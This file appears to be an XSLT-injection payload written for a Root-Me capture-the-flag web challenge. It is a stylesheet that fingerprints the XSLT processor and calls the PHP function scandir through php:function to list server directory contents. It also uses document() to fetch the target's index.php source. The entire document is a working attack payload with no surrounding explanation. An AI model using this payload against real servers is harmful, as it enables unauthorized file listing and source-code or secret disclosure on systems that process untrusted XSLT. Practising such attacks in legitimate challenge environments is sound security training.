<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;color:red;background-color:#000000">
    <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
    <p>
    	Version: <xsl:value-of select="system-property('xsl:version')" />
    	Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
    	Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
    	<xsl:variable name="assert" select="php:function('scandir', '.')"/>
        Dir: <xsl:value-of select="exsl:node-set($assert)/Item[1]"/>
        Dir: <xsl:value-of select="exsl:node-set($assert)/Item[2]"/>
        Dir: <xsl:value-of select="exsl:node-set($assert)/Item[3]"/>
        Dir: <xsl:value-of select="exsl:node-set($assert)/Item[4]"/>
        
    	File: <xsl:copy-of select="document('http://challenge01.root-me.org/web-serveur/ch50/index.php')"/>    
    </p>
</body>
</html> 
